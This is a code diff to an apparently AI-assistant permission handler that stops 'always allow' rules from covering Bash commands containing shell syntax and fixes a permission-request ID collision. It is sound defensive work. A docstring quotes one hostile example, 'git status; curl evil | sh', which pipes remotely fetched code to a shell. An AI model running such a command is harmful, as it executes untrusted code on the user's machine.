@@ -35,6 +35,7 @@ from __future__ import annotations
 
 import asyncio
 import json
+import secrets
 import time
 from dataclasses import dataclass, field
 from pathlib import Path
@@ -210,6 +211,11 @@ to sound like them, not like a house style.
 The guidance above still applies wherever the voice description is silent."""
 
 
+# Characters that let one command line run more than one command.  A rule
+# scoped to a first word means nothing in their presence.
+SHELL_SYNTAX = ";&|`$><\n"
+
+
 @dataclass
 class EditRecord:
     """One file the agent changed, for the undo chip in the transcript."""
@@ -322,9 +328,17 @@ class ProjectAgent:
 
         Scoped by the command's first word, never blanket: allowing
         `latexmk -c` must not also allow `rm`.
+
+        The first word only means anything if it is the whole story.  A
+        shell runs `git status; curl evil | sh` as three commands, and the
+        rule `Bash:git` would have covered all of them for good -- so a
+        command carrying shell syntax gets a rule nothing can match, and is
+        asked about every single time.
         """
         if tool_name == "Bash":
             command = (data.get("command") or "").strip()
+            if any(character in command for character in SHELL_SYNTAX):
+                return ""
             first = command.split()[0] if command else ""
             return f"Bash:{first}"
         return tool_name
@@ -451,13 +465,21 @@ class ProjectAgent:
             result["stopReason"] = "Interrupted."
         return result
 
+    async def _ask_user_would_return(self, tool_name: str, tool_input: dict) -> bool:
+        """Whether a remembered rule already covers this call, without asking."""
+        rule = self._rule_for(tool_name, tool_input)
+        return bool(rule) and rule in self._always_allow
+
     async def _ask_user(self, tool_name: str, tool_input: dict) -> str:
         """Put a permission card in front of the user and wait for the answer."""
         rule = self._rule_for(tool_name, tool_input)
-        if rule in self._always_allow:
+        if rule and rule in self._always_allow:
             return "allow"
 
-        request_id = f"perm-{int(time.time()*1000)}-{len(self._pending)}"
+        # Two tool calls can land in the same millisecond, and the second
+        # then replaced the first's future -- which nothing ever resolved,
+        # so that turn waited for an answer to a card nobody could see.
+        request_id = f"perm-{int(time.time()*1000)}-{secrets.token_hex(3)}"
         future: asyncio.Future = asyncio.get_running_loop().create_future()
         self._pending[request_id] = future
 
@@ -1098,7 +1120,7 @@ class ProjectAgent:
         if (model or None) == (self.model or None):
             return
         self.model = model or None
-        await self.close()
+        await self.disconnect()
 
     async def _flush_edits(self) -> None:
         for edit in self.drain_edits():
